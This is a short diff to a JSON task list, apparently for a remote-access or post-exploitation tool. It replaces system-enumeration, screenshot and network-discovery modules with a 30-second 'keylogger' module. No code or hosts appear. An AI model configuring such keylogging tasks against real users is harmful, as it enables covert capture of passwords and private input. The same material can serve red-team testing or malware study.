@@ -1,16 +1,8 @@
 [
     {
-        "module": "system_enum",
-        "args": {}
-    },
-    {
-        "module": "screenshot",
-        "args": {}
-    },
-    {
-        "module": "discovery",
+        "module": "keylogger",
         "args": {
-            "ip_range": null
+            "duration": 30
         }
     }
 ]
